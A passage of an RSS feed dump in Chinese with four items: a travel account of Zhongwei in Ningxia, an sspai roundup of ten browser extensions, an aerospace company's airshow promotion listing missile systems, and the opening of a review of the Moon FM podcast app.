data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2000\" data-rawheight=\"1125\" data-watermark=\"watermark\" data-original-src=\"v2-e88b9bff8364e4a791eaeecafa183f83\" data-watermark-src=\"v2-014d334b8ef515a71fe1bdb6cd6b6162\" data-private-watermark-src=\"v2-fff617c5430e26149e969bf7280c0f99\"></p>\n<h3>宁夏中卫寺口子景区：一线天</h3>\n<p>寺口子古称北海，有着丰富的人文景观和独特的自然风光，有“历史博物馆”之称。寺口子风景区分为东、西两部分景区，东景区有壮观的塞上大裂谷，主要奇观有一线天、宁夏版图、神仙右脚印等；西景区有苏武牧羊人文景观，云汉天度索桥长100米高100米宽60公分，让人走上去两腿发软。</p>\n<p>一线天景点最适合拍照。这里堪称婚纱照集散中心。除了我们基本都是拍婚纱照的。所以可以想见是多么适合情侣一起来了。一线天这里不大，但是因为地形地貌和光影的结合，很是出片。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-e8b1b1cd8c4ddfe8ba9a6d04fcffc129_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2216\" data-rawheight=\"3936\" data-watermark=\"watermark\" data-original-src=\"v2-e8b1b1cd8c4ddfe8ba9a6d04fcffc129\" data-watermark-src=\"v2-ac7e09d527bd4777c6903bada912f377\" data-private-watermark-src=\"v2-890400505dd826be0ff264a9b4c7e926\"></p>\n<p><img src=\"https://pic2.zhimg.com/v2-4d222c6429e5ed229bbd706fc963ec74_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2216\" data-rawheight=\"3936\" data-watermark=\"watermark\" data-original-src=\"v2-4d222c6429e5ed229bbd706fc963ec74\" data-watermark-src=\"v2-6bcb81bfc8961d106d65298b161e0414\" data-private-watermark-src=\"v2-dc536dd6d0f9d9e88808ea502514bf90\"></p>\n<h3>中卫金沙海</h3>\n<p>我们住在【中卫金沙海火车主题旅馆】，住进停在沙漠之中的一趟复古绿皮火车。</p>\n<p>酒店介绍：中卫金沙海火车主题旅馆地处中卫沙坡头区迎闫公路与小湖路交汇处，是一家以蒸汽火车为主题的特色旅馆。它是世界上第一代火车，是1958年中国第一条沙漠铁路——包兰铁路通车时使用过的蒸汽机车，是那个火红年代旅行的特殊记忆，是开启人类历史上一个崭新时代的震撼。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-424aa9398a78ceaeb8c44d490eeada95_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2000\" data-rawheight=\"1125\" data-watermark=\"watermark\" data-original-src=\"v2-424aa9398a78ceaeb8c44d490eeada95\" data-watermark-src=\"v2-ef9f580c60be840327e10de5d90ea494\" data-private-watermark-src=\"v2-6c115e73866e06b65a2310dbfc78a4c7\"></p>\n<p><img src=\"https://pic2.zhimg.com/v2-cb05dcf357d82c6fffa25891071d2ce1_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2500\" data-rawheight=\"1408\" data-watermark=\"watermark\" data-original-src=\"v2-cb05dcf357d82c6fffa25891071d2ce1\" data-watermark-src=\"v2-ac57b19449b4cb73e51aea6c032e1c40\" data-private-watermark-src=\"v2-7b67e5506d1dc14e225724c7d30fba46\"></p>\n<p><img src=\"https://pic2.zhimg.com/v2-84f7088da22ea3ab3a0ee7287de0f078_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1477\" data-rawheight=\"2216\" data-watermark=\"watermark\" data-original-src=\"v2-84f7088da22ea3ab3a0ee7287de0f078\" data-watermark-src=\"v2-a75e191a008d346648370df3788ba5ae\" data-private-watermark-src=\"v2-8afc1314da52926dfc0a9975c76d04fc\"></p>\n<p><img src=\"https://pic4.zhimg.com/v2-87b641b442d07ff285f21ae4320725e8_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2500\" data-rawheight=\"1408\" data-watermark=\"watermark\" data-original-src=\"v2-87b641b442d07ff285f21ae4320725e8\" data-watermark-src=\"v2-efa53925bca450249db28631bd0d903c\" data-private-watermark-src=\"v2-5903010154fedb366e57b3b2f8af7d66\"></p>\n<p></p>\n<p></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/susutuotuo?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">素素拓拓的旅行派</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/483991353/answer/2130690522?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">28 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/482179745?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">从目前疫情防控情况看，您认为中秋国庆能否外出旅游？</a><br><a href=\"http://www.zhihu.com/question/378061345?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">疫情过后，你的旅游名单排名第一的是什么地方？</a><br>\n","link":"http://www.zhihu.com/question/483991353/answer/2130690522?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"实用而有趣的浏览器扩展，我们又为你找到了这 10 款","date":"2021-09-29 08:00:00","description":"\n<p>距离少数派上次推荐浏览器扩展已两月有余，Chrome 的版本号已经来到了 94，而 Firefox 也做出了将默认搜索引擎替换为 Bing 的尝试（仅在参与研究的用户中静默替换 10%），对更好的网页浏览体验的追求总是无止境的，那么浏览器扩展这边又哪些好用、有趣的「新玩意」和值得关注的更新呢？</p>\n<p>本文就为你搜集了 10 款值得一试的浏览器扩展。</p>\n<p><strong>关联阅读：</strong><a href=\"https://sspai.com/post/69008\">更快的稳定版更新节奏开始了：Chrome/Edge 94 新功能盘点</a></p>\n<h2>Jumpskip：跳过 Jump scare</h2>\n<p>你是否和很多人一样喜欢观看惊悚悬疑剧集却常常被其中的 Jump scare（突发惊吓）吓到？</p>\n<p>开发者 <a href=\"https://alyssax.com/\" target=\"_blank\">Alyssa X</a> 开发了一款 Netflix 的 Chrome 扩展解决这个问题。<a href=\"https://github.com/alyssaxuu/jumpskip\" target=\"_blank\">Jumpskip</a> 能帮助你在观看剧集时跳过、静音和提前发出警告，同时还可以查看所有 Jump scare 的时间戳，让你有所准备、免受惊扰。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5a0vgdb34teh3cl8ie0.png\"></figure><p>你可以在 <a href=\"https://github.com/alyssaxuu/jumpskip\" target=\"_blank\">GitHub</a> 或 <a href=\"https://chrome.google.com/webstore/detail/jumpskip-skip-jumpscares/fbemiaecodgpghdfegmdcikjkobdghab\" target=\"_blank\">Chrome 网上应用商店</a> 免费获取 Jumpskip。</p>\n<h2>Tango：快速制作带截图的流程指南</h2>\n<p>Tango 是一个有创意且实用的快速制作流程指南的工具。</p>\n<p>其便捷之处在于你只需要在浏览器中完成整个流程动作而不需要考虑其他问题，Tango 会自动按步骤生成流程文档，并配上带有高亮的截图和明确的操作文本。文档生成之后，你可以自由地进行编辑、评论等操作，并分享链接给任何人，甚至下载一份简洁的 PDF 文档。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5a0vgdb34teh3cl8ieg.png\"></figure><p>我使用 Tango 制作了一个<a href=\"https://app.tango.us/app/workflow/07576640-5ffa-470b-8ec3-a2c8db4764bd\" target=\"_blank\">实例</a>，以供大家参考。</p>\n<p>你可以在 <a href=\"https://www.tango.us/\" target=\"_blank\">官网</a> 或 <a href=\"https://chrome.google.com/webstore/detail/tango/lggdbpblkekjjbobadliahffoaobaknh\" target=\"_blank\">Chrome 网上应用商店</a> 免费获取 Tango。</p>\n<h2>Bubbles：网页截图分享协作</h2>\n<p>Bubbles 是一款网页截图分享协作扩展。你可以在网页中生成长截图或录制视频，并分享给任何人。而打开链接的任何用户均有权限对分享的截图或视频进行标注评论。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5a0vglb34teh5fkvac0.png\"></figure><p>我使用 Bubbles 制作了一个<a href=\"https://app.usebubbles.com/qNvJPsoHH2ehwvhSjRmfYi/comments-on-shyrz-me/\" target=\"_blank\">实例</a>，以供大家参考。</p>\n<p>你可以在 <a href=\"https://www.usebubbles.com/\" target=\"_blank\">官网</a> 或 <a href=\"https://chrome.google.com/webstore/detail/bubbles-screenshot-and-sc/ppbfhhgcdehhbjigifndnfmcihegokbb\" target=\"_blank\">Chrome 网上应用商店</a> 免费获取 Bubbles。</p>\n<h2>SingleFile：更优雅的网页保存方式</h2>\n<p>相信很多用户常有保存网页的需求，但却因难以管理的网页内容文件而头痛。以维基百科为例，普通 <code>Ctrl + S</code> 保存方式将生成以下文件：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5a0vgtb34teh5fkvacg.png\"></figure><p>同时，在 <code>{sitename}_files</code> 文件夹下，会一股脑地塞进 <code>.html</code> 文件所引用的各种图片、脚本，</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5a0vh5b34teh3cl8if0.png\"></figure><p>而 SingleFile 可以帮助你将完整的网页保存到单个文件中，且占用空间更小。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5a0vhdb34teit0pmne0.png\"></figure><p>除此之外，SingleFile 还提供丰富的设置项，可以对文件名、HTML 内容、样式、图片、字体等进行调整。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5a0vhlb34teh3cl8ifg.png\"></figure><p>你可以在 <a href=\"https://github.com/gildas-lormeau/SingleFile\" target=\"_blank\">GitHub</a>、<a href=\"https://chrome.google.com/extensions/detail/mpiodijhokgodhhofbcjdecpffjipkle\" target=\"_blank\">Chrome 网上应用商店</a>、<a href=\"https://microsoftedge.microsoft.com/addons/detail/efnbkdcfmcmnhlkaijjjmhjjgladedno\" target=\"_blank\">Edge 网上应用商店</a> 或 <a href=\"https://addons.mozilla.org/firefox/addon/single-file\" target=\"_blank\">Firefox 附加组件商店</a> 免费获取 SingleFile。</p>\n<h2>划词翻译：支持 DeepL 的翻译扩展</h2>\n<p>浏览器网页翻译扩展不少，但像划词翻译这样颜值与功能兼备的并不多。</p>\n<p>划词翻译可以对网页、图片、PDF 文件、音频进行翻译，翻译接口包括 DeepL、谷歌、必应、百度、腾讯、彩云、阿里、搜狗、有道。需要注意的是，部分翻译接口需要用户前往对应平台<a href=\"https://hcfy.app/docs/services/intro/\" target=\"_blank\">申请 API 密钥</a>，好在过程并不复杂。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5a0vhtb34teh0gc1ang.png\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5a0vi5b34teh3cl8ig0.png\"></figure><p>你可以在 <a href=\"https://hcfy.app/\" target=\"_blank\">官网</a>、<a href=\"https://chrome.google.com/webstore/detail/ikhdkkncnoglghljlkmcimlnlhkeamad\" target=\"_blank\">Chrome 网上应用商店</a>、<a href=\"https://microsoftedge.microsoft.com/addons/detail/oikmahiipjniocckomdccmplodldodja\" target=\"_blank\">Edge 网上应用商店</a> 或 <a href=\"https://addons.mozilla.org/zh-CN/firefox/addon/hcfy/\" target=\"_blank\">Firefox 附加组件商店</a> 免费获取划词翻译。</p>\n<h2>New Tab Studio: 高度自定义的新标签页</h2>\n<p>如果你对 Momentum 等老牌 New Tab 浏览器扩展感到审美疲劳，不妨来尝试一下这款 New Tab Studio。</p>\n<p>这是一款可高度自定义的新标签页，所有界面元素均以插件形式挂载到扩展中，包括倒数日、时钟、名言、习惯、自定义文本等，甚至还允许内嵌网页作为 <code>iframe</code>。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5a0vidb34teit0pmneg.png\"></figure><p>同时，扩展还支持将你制作的主题上传到用户主题商店分享给其他用户，或者下载别人制作好的主题。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5a0vitb34teh0gc1ao0.png\"></figure><p>你可以在 <a href=\"https://new-tab.studio/\" target=\"_blank\">官网</a> 或者 <a href=\"https://chrome.google.com/webstore/detail/new-tab-studio-countdown/epngggilgnflanfabeldfpbgponcgpgl\" target=\"_blank\">Chrome 网上应用商店</a> 免费获取 New Tab Studio。另外，扩展还有付费的 Pro 版本可供选择。</p>\n<h2>Mue：简洁实用的开源新标签页</h2>\n<p>Mue 是一款开源的新标签页浏览器扩展，界面简洁大方，支持自定义背景、时间、名言、问候、搜索、快速链接、天气、备忘录等，是非常好的 Momentum 开源替代。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5a0vjlb34teh3cl8igg.png\"></figure><p>你可以在 <a href=\"https://github.com/mue/mue\" target=\"_blank\">GitHub</a>、<a href=\"https://chrome.google.com/webstore/detail/mue/bngmbednanpcfochchhgbkookpiaiaid\" target=\"_blank\">Chrome 网上应用商店</a>、<a href=\"https://microsoftedge.microsoft.com/addons/detail/aepnglgjfokepefimhbnibfjekidhmja\" target=\"_blank\">Edge 网上应用商店</a>、<a href=\"https://addons.mozilla.org/firefox/addon/mue\" target=\"_blank\">Firefox 附加组件商店</a>免费获取 Mue。</p>\n<h2>Microsoft Outlook：微软邮箱应用的浏览器扩展版本</h2>\n<p>没错，Microsoft Outlook 推出了一款浏览器插件。</p>\n<p>如果你是 Microsoft 全家桶用户想必会非常欣喜，因为它除了收发邮件外还将日历、联系人、甚至 Microsoft Todo 整合到了一起。虽然当前还处于预览版本，但已颇为可用，邮件内容也可以一并在扩展内查看而不是跳转网页。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5a0vjtb34teh0gc1aog.png\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5a0vk5b34teh0gc1ap0.png\"></figure><p>你可以在 <a href=\"https://microsoftedge.microsoft.com/addons/detail/microsoft-outlook/kkpalkknhlklpbflpcpkepmmbnmfailf\" target=\"_blank\">Edge 网上应用商店</a> 免费获取 Microsoft Outlook。</p>\n<h2>tabExtend：更实用的标签页管理方式</h2>\n<p>tabExtend 是一款标签页管理浏览器扩展，能够帮助你轻松处理标签页、笔记和待办事项，在浏览器中更便捷地组织所有内容。</p>\n<p>相较于浏览器传统的标签页管理方式，tabExtend 具有更直观的界面，同时将标签页与笔记、待办事项轻度结合使得这个扩展有更多可能性，也更符合用户的使用逻辑。界面美观，动效有趣，只需鼠标拖动即可将标签页进行分类和暂存。试用版本仅可使用 1 个工作区、存储 30 个标签页，付费版本则可使用多个工作区、无限存储标签页，每月 6 美元。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5a0vk5b34teh0gc1apg.png\"></figure><p>你可以在 <a href=\"https://www.tabextend.com/\" target=\"_blank\">官网</a>、<a href=\"https://chrome.google.com/webstore/detail/tabextend/ffikidnnejmibopbgbelephlpigeniph\" target=\"_blank\">Chrome 网上应用商店</a> 或 <a href=\"https://microsoftedge.microsoft.com/addons/detail/tabextend/afddlgcjhdhkgimldgmppegmnbmogolg\" target=\"_blank\">Edge 网上应用商店</a> 免费获取 tabExtend。</p>\n<h2>Workona：标签页管理一站式解决方案</h2>\n<p>Workona 其实之前在少数派 <a href=\"https://sspai.com/post/56888\" target=\"_blank\">2019 年的文章</a>中有所提及，经过两年发展尤其是近期 Workona 推出了付费计划之后，整个产品的方向从之前类似 Station 的形态发生了较大转变，如今的 Workona 更像是上文提及的 tabExtend 的高阶替代，主要面向团队用户（不过对个人用户也很好用），对标签页的组织方式更全面、也与多人协作结合更紧密。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5a0vkdb34teh3cl8ih0.png\"></figure><p>Workona 提供的扩展多达 4 种，用户可根据需要下载以启用对应功能。</p>\n<p>其中 Workona Tab Manager 是主扩展，类似上文提到的 tabExtend 的主要功能 —— 对标签页进行分工作区、分组的管理：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5a0vklb34teh0gc1aq0.png\"></figure><p>而笔记方面，Workona 内置了一个较为完善的文本编辑器，支持 Markdown 的同时还允许用户将笔记与保存的标签页进行绑定：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5a0vktb34teh5fkvad0.png\"></figure><p>如图所示，Workona Tab Manager 的主界面在开启 Task 后分为两栏显示，对标签页的操作在左侧 Tabs 栏内完成，只需将标签页拖动到你想要分类的区域（左栏）即可。而对工作区（Workspace）中常用的一些页面，则可以点击书签按钮将其标记为资源（Resource），该标签页将永久保存到当前工作区。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5a0vl5b34teh3cl8ii0.png\"></figure><p>Workona Tab Suspender 是标签页冻结扩展，启用后可以在闲置时（或其他设定条件）冻结标签页以降低浏览器内存占用。如果你曾经使用过 The Great Suspender，就知道这个扩展的价值所在。但由于其原作者将其出售，新作者在其中植入可疑代码的消息传出导致很多人弃用了这款扩展。不过好在有开发者将其原开源代码复刻后上传商店，涌现出 The Great Suspender Original、The Marvellous Suspender 等衍生作品。而 Workona Tab Suspender 也是一款优秀替代，其实早在 The Great Suspender 被收购之前，Workona 就内置了此功能，堪称神器。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5a0vl5b34teh3cl8iig.png\"></figure><p>Workona Task 是待办事项扩展，启用后用户可以进行简单的待办事项管理和协作：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5a0vldb34teh3cl8ij0.png\"></figure><p>最后，Workona New Tab 是新标签页扩展，启用后会将新标签页替换为 Workona 面板。</p>\n<p>前文提到 Workona 是一个面向团队的解决方案，因此如果你是团队用户的话，上述功能均可在团队空间中共享协作：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5a0vllb34teh0gc1aqg.png\"></figure><p>Workona 免费账户仅允许创建 5 个工作区，但与 tabExtend 不同的是对标签页、任务、笔记的数量没有限制；而 Pro 和 Business 账户则不限制工作区，并提供一系列增值功能，价格分别为每人每月 7 美元和 15 美元。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5a0vllb34teh3cl8ijg.png\"></figure><p>你可以在 <a href=\"https://workona.com/\" target=\"_blank\">官网</a> 免费获取 Workona 的四种不同扩展，此外还提供 <a href=\"https://apps.apple.com/us/app/workona-project-organizer/id1514249129\" target=\"_blank\">iPadOS 应用</a>。</p>\n<hr>\n<p>以上就是本期介绍的所有 10 款浏览器扩展插件，如果你也有好的扩展插件，欢迎在评论留言分享，我们下期再见~</p>\n<p>&gt; 还没看够？<a href=\"https://sspai.com/topic/102\" target=\"_blank\">浏览扩展百宝箱</a> 专题现已上线，总有一款适合你！</p>\n<p>&gt; 下载少数派 <a href=\"https://sspai.com/page/client\">客户端 </a>、关注 <a href=\"https://sspai.com/s/J71e\">少数派公众号 </a>，了解更妙的数字生活 🍃</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/69035"},{"title":"剧透 | 航展来了，中国航天科工全域攻防装备这都有","date":"2021-09-29 07:25:58","description":"\n<p>第十三届中国国际航空航天博览会28日开幕在即，中国航天科工集团有限公司将携全域攻防装备七大体系、113项装备展品重磅亮相！</p>\n<a href=\"https://www.zhihu.com/zvideo/1425524232306065408\" data-draft-node=\"block\" data-draft-type=\"link-card\"></a><p>本届航展，中国航天科工将以历史最大规模参展,展区总面积近6000平米，立足“七大体系、室内室外、线上线下”展示构架，系统展示防空体系、海防体系、对地打击体系、无人作战体系、预警监视安防体系、商业航天体系、指挥通信与支援保障体系的整体能力及主力产品。</p>\n<p>HQ-9BE防空导弹地空导弹、FK-2000、CM-802B反舰导弹、YJ-12E多平台超声速导弹、BP-12B导弹武器系统、AG-300系列多用途空地导弹、“猎鹰”、“天鹰”、“海鹰”逐“箭”、追“星”腾“云”等<b>113项装备展品</b>重磅亮相！！！</p>\n<p>高清大图  在这里！</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-383295306825457f886d372e39d0fb19_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"729\" class=\"origin_image zh-lightbox-thumb\" width=\"1080\" data-original=\"https://pic2.zhimg.com/v2-383295306825457f886d372e39d0fb19_r.jpg\"></figure><p class=\"ztext-empty-paragraph\"><br></p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-6c283e71453b6d68823bb76e60f44ddb_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"729\" class=\"origin_image zh-lightbox-thumb\" width=\"1080\" data-original=\"https://pic4.zhimg.com/v2-6c283e71453b6d68823bb76e60f44ddb_r.jpg\"></figure><p class=\"ztext-empty-paragraph\"><br></p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-31ee647537e59504e54172d8181ef1b5_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"729\" class=\"origin_image zh-lightbox-thumb\" width=\"1080\" data-original=\"https://pic2.zhimg.com/v2-31ee647537e59504e54172d8181ef1b5_r.jpg\"></figure><p class=\"ztext-empty-paragraph\"><br></p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-5781ef5672a34f130007d9dffbbccc44_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"729\" class=\"origin_image zh-lightbox-thumb\" width=\"1080\" data-original=\"https://pic1.zhimg.com/v2-5781ef5672a34f130007d9dffbbccc44_r.jpg\"></figure><p class=\"ztext-empty-paragraph\"><br></p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-1c0d9cc81e88b591eb04d717050926d5_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"729\" class=\"origin_image zh-lightbox-thumb\" width=\"1080\" data-original=\"https://pic2.zhimg.com/v2-1c0d9cc81e88b591eb04d717050926d5_r.jpg\"></figure><p class=\"ztext-empty-paragraph\"><br></p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-0a49fb8aa4384ea63996c24929d671e2_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"729\" class=\"origin_image zh-lightbox-thumb\" width=\"1080\" data-original=\"https://pic3.zhimg.com/v2-0a49fb8aa4384ea63996c24929d671e2_r.jpg\"></figure><p class=\"ztext-empty-paragraph\"><br></p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-edd4ecd930267b9387af60cc88f08114_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"729\" class=\"origin_image zh-lightbox-thumb\" width=\"1080\" data-original=\"https://pic1.zhimg.com/v2-edd4ecd930267b9387af60cc88f08114_r.jpg\"></figure><p class=\"ztext-empty-paragraph\"><br></p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-07728c261a820d7fca6bc60cb3ca7c96_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"729\" class=\"origin_image zh-lightbox-thumb\" width=\"1080\" data-original=\"https://pic3.zhimg.com/v2-07728c261a820d7fca6bc60cb3ca7c96_r.jpg\"></figure><p class=\"ztext-empty-paragraph\"><br></p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-bc8373a00b23c7121db35a24dde1cca1_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"729\" class=\"origin_image zh-lightbox-thumb\" width=\"1080\" data-original=\"https://pic2.zhimg.com/v2-bc8373a00b23c7121db35a24dde1cca1_r.jpg\"></figure><p class=\"ztext-empty-paragraph\"><br></p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-b7b1648ec91b11db305fb4211ae8e8c8_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"729\" class=\"origin_image zh-lightbox-thumb\" width=\"1080\" data-original=\"https://pic1.zhimg.com/v2-b7b1648ec91b11db305fb4211ae8e8c8_r.jpg\"></figure><p class=\"ztext-empty-paragraph\"><br></p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-df189f0201a902ff701c27b9cfa003cc_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"729\" class=\"origin_image zh-lightbox-thumb\" width=\"1080\" data-original=\"https://pic1.zhimg.com/v2-df189f0201a902ff701c27b9cfa003cc_r.jpg\"></figure><p class=\"ztext-empty-paragraph\"><br></p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-857f63d724137fbdc049319cc1f7afb6_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"729\" class=\"origin_image zh-lightbox-thumb\" width=\"1080\" data-original=\"https://pic3.zhimg.com/v2-857f63d724137fbdc049319cc1f7afb6_r.jpg\"></figure><p>本届航展，中国航天科工将以历史最大规模参展，展区总面积近6000平米，立足“七大体系、室内室外、线上线下”展示构架。航展上，中国航天科工“高精尖”装备汇聚一堂，一批代表世界先进水平的新产品、新技术、新服务、新成果将进行首发首展。</p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/zhong-guo-hang-tian-ke-gong?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">中国航天科工</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br>\n","link":"http://zhuanlan.zhihu.com/p/414378231?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"设计精美功能全，好用的全平台播客 App：Moon FM","date":"2021-09-29 06:35:50","description":"\n<p>现在听播客成为了相当受欢迎的获取新知识和内容的途径，而对于大部分的用户而言，收听播客往往通过网易云音乐、喜马拉雅这些专门提供音频内容的平台，至于专门收听播客的平台，小宇宙、Apple 的 Podcast 都是不错的渠道，你只需要在上面搜索或者通过推荐页找到自己喜欢的播客节目。选择关注或者订阅就可以收听</p>\n<p>但对于真正的播客爱好者而言，通过平台进行收听播客有着天然的局限性，并不是自己喜欢的节目都可以在某一个单一平台都能听到，所以更希望能够自由地选择播客节目并使用 RSS 源地址来进行播客节目的订阅，我们将这种播客客户端作为泛用型播客客户端，而这其中不乏有大家耳熟能详的 App：Pocket Casts、Overcast、Castro……</p>\n<p>但对比这些泛用型播客客户端之后其实不难发现，其部分功能并不适应国内的播客使用场景，尤其是在跨平台同步上都或多或少都存在一些不便之处，那么有没有适用于国内播客收听场景，同时支持跨平台同步的泛用型播客客户端呢？</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c541rgtb34te12vuo61g.png\"></figure><p>由国内应用开发者 DengMing Gao 开发的跨平台泛用型播客客户端 Moon FM 则很好的满足上面我提到的诸多针对播客客户端的功能需求，作为一款泛用型播客客户端，Moon FM 支持最为主要的两个桌面操作系统 macOS 以及 Windows 10，甚至还支持略为小众的 Linux，移动端则支持了 iOS 以及 Android，可以说是目前支持平台最全的跨平台泛用型播客客户端了。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c541rh5b34te2hpltpgg.png\"></figure><p>和那些平台型的播客客户端相比，Moon FM 是一款真正意义上的「无账户系统」的播客客户端，无需注册就可以直接进行播客节目的订阅并开始收听。对于没有多端同步需求的用户而言，Moon FM 每一个端都可以作为本地客户端来使用。</p>\n<p>当然 Moon FM 也支持跨端的同步——你可以通过自部署同步服务来实现各个端之间的数据同步，Moon FM 支持同步的数据包括订阅源列表、播放列表、历史记录以及收藏数据等，因此在建立起一个只属于自己的同步服务之后，你可以在任意一个端获得进度一致的播客聆听体验。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c541rh5b34te2nr88ftg.png\"></figure><h2>让播客订阅更为简单</h2>\n<p>作为泛用型播客客户端最为重要的功能，如何添加以及管理播客订阅其实最为关键，在 Moon FM 中除了最为基础的 RSS 订阅之外，还有导入 